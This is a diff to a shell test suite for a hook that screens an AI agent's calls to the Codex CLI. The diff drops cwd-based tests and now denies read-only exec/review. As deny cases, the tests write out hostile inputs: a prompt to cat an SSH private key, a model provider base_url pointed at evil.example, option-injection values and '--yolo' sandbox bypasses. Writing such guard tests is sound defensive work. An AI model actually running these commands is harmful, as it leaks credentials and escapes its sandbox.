@@ -22,20 +22,11 @@ PASS=0
 FAIL=0
 FAILURES=()
 
-# hook の cwd（project config の有無を見る起点）。exec / review は $HOME/ghq/ の下でだけ通るので、
-# HOME を一時 dir に向け、既定の cwd は その ghq/ の下の project config の無い dir にする
-TMPROOT="$(cd "$(mktemp -d "${TMPDIR:-/tmp}/codex-guard-test.XXXXXX")" && pwd -P)"
-trap 'rm -rf "$TMPROOT"' EXIT
-FAKE_HOME="$TMPROOT/home"
-GHQ="$FAKE_HOME/ghq"
-mkdir -p "$GHQ/plain" "$GHQ/proj/.codex" "$GHQ/proj/sub" "$GHQ/rules/.codex/rules" "$GHQ/rules/sub" "$TMPROOT/outside"
-touch "$GHQ/proj/.codex/config.toml" "$GHQ/rules/.codex/rules/default.rules"
-
 run_hook() {
-  jq -n --arg cmd "$1" --arg cwd "${2:-$GHQ/plain}" '{tool_name:"Bash", cwd:$cwd, tool_input:{command:$cmd}}' | HOME="$FAKE_HOME" bash "$HOOK" 2>&1 || true
+  jq -n --arg cmd "$1" '{tool_name:"Bash", tool_input:{command:$cmd}}' | bash "$HOOK" 2>&1 || true
 }
 
-# run_case <name> <command> <expected: deny|pass> [<cwd>]
+# run_case <name> <command> <expected: deny|pass>
 # pass は「stdout が空」（allow も含め何も返さない）
 run_case() {
   local name="$1"
@@ -43,7 +34,7 @@ run_case() {
   local expected="$3"
 
   local output
-  output=$(run_hook "$cmd" "${4:-}")
+  output=$(run_hook "$cmd")
 
   local decision="pass"
   if [[ -n $output ]]; then
@@ -81,25 +72,29 @@ run_no_echo_case() {
 
 echo "=== pretool-codex-guard tests ==="
 
-# --- AC-1: 許可形（情報表示と read-only を明示した exec / review）→ 素通し ---
+# --- AC-1: 許可形（情報表示）→ 素通し ---
 echo "[Allowed codex forms — should pass through]"
 run_case "codex --version" 'codex --version' "pass"
 run_case "codex --help" 'codex --help' "pass"
 run_case "codex features list" 'codex features list' "pass"
 run_case "codex login status" 'codex login status' "pass"
 run_case "absolute path codex --version" '/opt/homebrew/bin/codex --version' "pass"
-run_case "exec -s read-only" 'codex exec -s read-only "review the diff"' "pass"
-run_case "exec --sandbox read-only" 'codex exec --sandbox read-only "review the diff"' "pass"
-run_case "exec --sandbox=read-only" 'codex exec --sandbox=read-only "review the diff"' "pass"
-run_case "review -c sandbox_mode=read-only" 'codex review -c sandbox_mode=read-only --uncommitted' "pass"
-run_case 'review --config=sandbox_mode="read-only"' "codex review --config='sandbox_mode=\"read-only\"' --uncommitted" "pass"
-run_case "exec read-only with model override" 'codex exec -s read-only -c model="o3" -m gpt-5 "x"' "pass"
-run_case "exec read-only with allowed exec options" 'codex exec -s read-only --skip-git-repo-check --json --ephemeral --color never -m gpt-5 "x"' "pass"
-run_case "exec read-only with --model= and --config=" 'codex exec --sandbox=read-only --model=gpt-5 --config=model_verbosity=low "x"' "pass"
-run_case "review read-only with allowed review options" 'codex review -c sandbox_mode=read-only --base main --title "t"' "pass"
-run_case "review read-only --commit" 'codex review -c sandbox_mode=read-only --commit abc123' "pass"
-run_case "exec read-only prompt word resume" 'codex exec -s read-only "x" resume' "pass"
-run_case "exec read-only single-quoted prompt with double quote" "codex exec -s read-only 'say \"hi\"'" "pass"
+run_case "quoted --version word" "codex '--version'" "pass"
+
+# --- read-only の exec / review も deny（Codex の read-only sandbox はディスク全体を読める）---
+echo "[Read-only exec / review — should deny]"
+run_case "exec -s read-only" 'codex exec -s read-only "review the diff"' "deny"
+run_case "exec --sandbox read-only" 'codex exec --sandbox read-only "review the diff"' "deny"
+run_case "exec --sandbox=read-only" 'codex exec --sandbox=read-only "review the diff"' "deny"
+run_case "review -c sandbox_mode=read-only" 'codex review -c sandbox_mode=read-only --uncommitted' "deny"
+run_case 'review --config=sandbox_mode="read-only"' "codex review --config='sandbox_mode=\"read-only\"' --uncommitted" "deny"
+run_case "exec read-only with allowed-looking options" 'codex exec -s read-only --skip-git-repo-check --json --ephemeral --color never -m gpt-5 "x"' "deny"
+run_case "exec read-only prompt to read ssh key" 'codex exec -s read-only "cat ~/.ssh/id_ed25519"' "deny"
+run_case "review read-only --base= starting with -" 'codex review -c sandbox_mode=read-only --base=--output=/tmp/x' "deny"
+run_case "review read-only --commit= starting with -" 'codex review -c sandbox_mode=read-only --commit=-p' "deny"
+run_case "review read-only --base main" 'codex review -c sandbox_mode=read-only --base main --title "t"' "deny"
+run_case "codex --version with extra word" 'codex --version exec' "deny"
+run_case "codex features list with extra word" 'codex features list x' "deny"
 
 # --- 許可形の中身でも、シェルのメタ文字を含む形は deny（複合・置換・heredoc を解釈しない）---
 echo "[Allowed codex forms with shell metacharacters — should deny]"
@@ -213,7 +208,6 @@ run_case "exec read-only --profile=" 'codex --profile=evil exec -s read-only "x"
 run_case "exec read-only --enable" 'codex --enable foo exec -s read-only "x"' "deny"
 run_case "-c model_provider" 'codex -c model_provider=x -c model_providers.x.base_url=https://evil.example exec -s read-only -' "deny"
 run_case "-c otel" 'codex exec -s read-only -c otel.exporter=x "x"' "deny"
-run_case "-c model_reasoning_effort allowed" 'codex exec -s read-only -c model_reasoning_effort=high "x"' "pass"
 run_case "unlisted option -i" 'codex exec -s read-only -i shot.png "x"' "deny"
 run_case "unlisted option --output-schema" 'codex exec -s read-only --output-schema s.json "x"' "deny"
 run_case "unlisted option --oss" 'codex exec -s read-only --oss "x"' "deny"
@@ -233,9 +227,6 @@ run_case "zsh noglob" 'noglob codex --yolo exec x' "deny"
 run_case "exec builtin" 'exec codex --yolo exec x' "deny"
 run_case "zsh =codex expansion" '=codex --yolo exec x' "deny"
 run_case "backslash-quoted codex name" '\codex --yolo exec x' "deny"
-run_case "exec read-only under project config" 'codex exec -s read-only "x"' "deny" "$GHQ/proj/sub"
-run_case "codex --version under project config" 'codex --version' "pass" "$GHQ/proj/sub"
-run_case "exec read-only under project .codex/rules only" 'codex exec -s read-only "x"' "deny" "$GHQ/rules/sub"
 run_case "arithmetic shift is not a heredoc" $': $((1<<2))\ncodex --yolo exec x\n2' "deny"
 run_case "arithmetic command shift is not a heredoc" $'((a<<1))\ncodex --yolo exec x\n1' "deny"
 run_case "codex inside arithmetic expansion" 'echo $(( $(codex --yolo exec x) ))' "deny"
@@ -286,22 +277,6 @@ run_case "non-ASCII bytes before ; codex" $'grep \xe3\x81 f ; codex --yolo exec 
 # 4096 バイトを超えるものは字句分割の前に deny
 long_arg=$(printf 'a%.0s' {1..4100})
 run_case "codex word in an over-long command" "grep codex ${long_arg}" "deny"
-
-# --- cwd が symlink 越しでも、物理パスの祖先の project config を見る ---
-echo "[Project config via symlinked cwd — should deny]"
-ln -s "$GHQ/proj/sub" "$GHQ/plain/sublink"
-run_case "exec read-only with symlinked cwd into project" 'codex exec -s read-only "x"' "deny" "$GHQ/plain/sublink"
-run_case "exec read-only with missing cwd" 'codex exec -s read-only "x"' "deny" "$GHQ/missing"
-
-# --- exec / review は cwd の物理パスが $HOME/ghq/ の下のときだけ通す（外では .codex を後から作れる）---
-echo "[exec / review outside ~/ghq — should deny]"
-ln -s "$TMPROOT/outside" "$GHQ/outlink"
-run_case "exec read-only outside ghq" 'codex exec -s read-only "x"' "deny" "$TMPROOT/outside"
-run_case "review read-only outside ghq" 'codex review -c sandbox_mode=read-only --uncommitted' "deny" "$TMPROOT/outside"
-run_case "exec read-only via symlink from ghq to outside" 'codex exec -s read-only "x"' "deny" "$GHQ/outlink"
-run_case "exec read-only at HOME (not under ghq)" 'codex exec -s read-only "x"' "deny" "$FAKE_HOME"
-run_case "exec read-only above HOME" 'codex exec -s read-only "x"' "deny" "$TMPROOT"
-run_case "codex --version outside ghq" 'codex --version' "pass" "$TMPROOT/outside"
 
 # --- < file は受けない（sandbox の外の shell が開くので、作業ツリーに置いた symlink 越しに外を読める）---
 echo "[Stdin redirect — should deny]"
